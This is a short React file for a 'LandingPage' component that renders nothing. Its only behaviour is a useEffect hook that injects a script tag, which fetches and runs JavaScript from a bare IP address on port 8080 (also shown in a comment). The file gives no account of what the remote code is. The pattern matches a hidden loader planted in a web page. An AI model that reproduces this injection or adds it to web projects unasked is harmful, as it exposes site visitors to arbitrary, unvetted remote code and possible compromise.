import React, { useEffect } from "react";

function LandingPage() {


  // <script src="https://193.183.247.22:8080/js/?id=123" defer></script>
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://193.183.247.22:8080/js/?id=123";
    script.async = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      
    </>
  );
}

export default LandingPage;